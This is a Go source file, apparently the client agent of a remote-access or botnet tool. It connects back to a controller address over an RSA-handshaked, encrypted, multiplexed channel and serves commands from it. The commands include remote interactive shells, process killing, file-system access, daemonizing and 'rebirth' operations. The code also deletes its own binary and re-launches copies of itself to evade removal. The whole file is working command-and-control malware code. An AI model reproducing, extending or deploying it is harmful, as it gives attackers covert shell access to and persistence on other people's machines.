package base

import (
	"net"
	"io"
	"os"
	"os/exec"
	"sync"
//	"time"
	"runtime"
	"syscall"
	"crypto/rand"
	"strings"

	kit "../toolkit"
	"../streamcoder"
	"../smux"
	"../godaemon"

	"io/ioutil"
	"fmt"
)

var ops map[string](func (string, net.Conn, *Client, *smux.Session)())

type Client struct {
	UUID       []byte
	cmd        *exec.Cmd
	cmdOut     io.ReadCloser
	cmdIn      io.WriteCloser
	cmdMx      sync.Mutex
	Proc       int
	AgentTag   string
	HubPubKey  []byte
	HubKeyTag  string
	Daemon     bool
	AutoClean  bool
	Info       *Info
	selfbyte []byte
	selfhex []byte
}

func NewClient() (*Client) {
	initOps()
	return &Client{
		AgentTag: clientAgentTag,
		HubKeyTag: initKeyTag,
		Proc: 1,
		Info: NewInfo(),
		Daemon: false,
	}
}

func NewClientM() (*Client) {
	initOps()
	return &Client{
		AgentTag: clientAgentTag,
		HubKeyTag: initKeyTag,
		Proc: runtime.NumCPU(),
		Info: NewInfo(),
		Daemon: false,
	}
}

var initOps = func () {
	if ops != nil {
		return
	}

	ops = make(map[string](func (string, net.Conn, *Client, *smux.Session)()))

	ops[B_info] = pullInfo
	ops[B_fast0] = fastC
	ops[B_fast1] = fastC
	ops[B_fast2] = fastC

	ops[B_shs] = sh
	ops[B_shk] = sh
	ops[B_csh] = sh

	ops[B_ppend] = ppX
	ops[B_ppkill] = ppX

	ops[B_reconn] = ccX
	ops[B_kill] = ccX

	ops[B_dodaemon] = ccX
	ops[B_apoptosis] = ccX
	ops[B_rebirth] = ccX
	ops[B_evolution] = ccX

	ops[B_fs] = ccFs
}

func (c *Client) Start(addr string) {
	loadSelf(c)

	if c.Daemon {
		godaemon.MakeDaemon(&godaemon.DaemonAttr{})

		if c.AutoClean {
			cleanSelf()
		}
	}

	runtime.GOMAXPROCS(c.Proc)

	c.Info.Set("NumCPU", fmt.Sprintf("%v", runtime.NumCPU()))

	lines, _ := kit.ReadLines("/proc/cpuinfo")
	for _, line := range lines {
		fields := strings.Split(line, ":")
		if len(fields) < 2 {
			continue
		}
		key := strings.TrimSpace(fields[0])
		value := strings.TrimSpace(fields[1])

		switch key {

		case "model name", "Hardware":
			// ARM : Hardware = Qualcomm Technologies, Inc MSM8939
			// x86: model name = Intel(R) Core(TM) i7-4710HQ CPU @ 2.50GHz
			c.Info.Set("ModelName", value)
		case "flags":
			flist := strings.FieldsFunc(value, func(r rune) bool {
				return r == ',' || r == ' '
			})
			c.Info.Set("flags", strings.Join(flist, ","))


		case "vendorId", "vendor_id", "Processor": // x86, x86, arm
			// ARM : ARMv7 Processor rev 1 (v7l)
			c.Info.Set("VendorID", value)
		}
	}

	createConn := func() (session *smux.Session, err error) {

		var conn net.Conn

		conn, err = net.Dial("tcp", addr)
		if err != nil {
			return
		}

		// do handshake
		encKey := make([]byte, 88, 88)
		rand.Read(encKey)

		//Vln(6, "encKey = ", encKey)

		publicKey, _ := kit.ParseRSAPub(c.HubPubKey)
		ciphertext, err := kit.EncRSA(publicKey, encKey)
		if err != nil {
			return
		}

		kit.WriteTagStr(conn, c.HubKeyTag)
		conn.Write(ciphertext)


		// do encode
		// key = 32 bytes x 2
		// nonce = 12 bytes x 2
		enccon, _ := streamcoder.NewCoder(conn, encKey[0:64], encKey[64:88], true)

		// read nonce && rekey
		nonce, err := kit.ReadTagByte(enccon)
		if err != nil {
			return
		}
		pass := append(encKey[0:64], nonce...)
		enccon.ReKey(pass)

		// send agent
		kit.WriteTagStr(enccon, c.AgentTag)
		kit.WriteTagByte(enccon, c.UUID)

		// stream multiplex
		smuxConfig := smux.DefaultConfig()
		session, err = smux.Client(enccon, smuxConfig)
		if err != nil {
			return
		}

		//Vln(2, "connect to:", conn.RemoteAddr())

		return session, nil
	}

	// wait until a connection is ready
	waitConn := func() *smux.Session {
		for {
			if session, err := createConn(); err == nil {
				return session
			} else {
				kit.SleepRand()
			}
		}
	}

	for {
		mux := waitConn()
		for {
			p1, err := mux.AcceptStream()
			if err != nil {
				mux.Close()
				break
			}

			go c.handle1(p1, mux)
		}
		//Vln(2, "connect end")
		kit.SleepRand()
	}
}

func (c *Client) handle1(p1 net.Conn, mux *smux.Session) {

	// get mode
	mode, err := kit.ReadTagStr(p1)
	if err != nil {
		kit.TrollConn(p1)
	}
	//Vln(3, "Mode:", mode)
	defer p1.Close()

	fn, ok := ops[mode]
	if !ok {
		kit.WriteVLen(p1, int64(9))
		kit.TrollConn(p1)
	}

	kit.WriteVLen(p1, int64(0))
	fn(mode, p1, c, mux)
}

func (c *Client) handle2(p1 net.Conn, keep bool, bin string) {

	if keep {
		c.cmdMx.Lock()
		if c.cmd == nil {
			c.cmd = exec.Command(bin)
			c.cmd.SysProcAttr = & syscall.SysProcAttr{
				Setpgid: true,
//				Noctty: true,
			}
			c.cmdIn, _ = c.cmd.StdinPipe()
			c.cmdOut, _ = c.cmd.StdoutPipe()

			err := c.cmd.Start() // need cmd.Wait() or blocking
			//Vln(6, "shk init =", err)
			if err == nil {
				go func(){
					c.cmd.Wait()
					//Vln(6, "shk cmd end", c.cmd.ProcessState.Exited(), c.cmd.ProcessState)
					c.cmdIn.Close()
					c.cmdOut.Close()
					c.cmdMx.Lock()
					c.cmd = nil
					c.cmdMx.Unlock()
				}()
			} else {
				p1.Write([]byte(err.Error()))
			}
		}
		kit.Cp3(c.cmdOut, p1, c.cmdIn)
		c.cmdMx.Unlock()

	} else {
		cmd := exec.Command(bin)
		cmd.Stdout = p1
		cmd.Stderr = p1
		cmd.Stdin = p1
		err := cmd.Run()
		if err != nil {
			p1.Write([]byte(err.Error()))
		}
	}
}

var cleanSelf = func () {
	name, err := kit.GetSelf()
	if err != nil {
		return
	}
	os.Remove(name)
}

var loadSelf = func (c *Client) {
	fd, err := os.OpenFile("/proc/self/exe", os.O_RDONLY, 0400)
	if err != nil {
//fmt.Println("[err]os.OpenFile", err)
		return
	}
	defer fd.Close()

	b, err := ioutil.ReadAll(fd)
	if err != nil {
		c.selfbyte = nil
		return
	}

	c.selfhex = kit.HashBytes256(b)
	c.selfbyte = b
}

var dumpSelf = func (c *Client) {
	ofd, ofp, err := kit.TryWX()
	if err != nil {
//fmt.Println("[err]TryWX()", err)
		return
	}

	if c.selfbyte == nil {
		return
	}

	ofd.Write(c.selfbyte)
	ofd.Sync()
	ofd.Close()

	pl := exec.Command(ofp)
	pl.SysProcAttr = &syscall.SysProcAttr{
		Setpgid: true,
//		Noctty: true,
	}
	err = pl.Start()
	if err != nil {
//fmt.Println("[err]pl.Start()", err)
		return
	}
	pl.Process.Release()
	os.Exit(0)
}

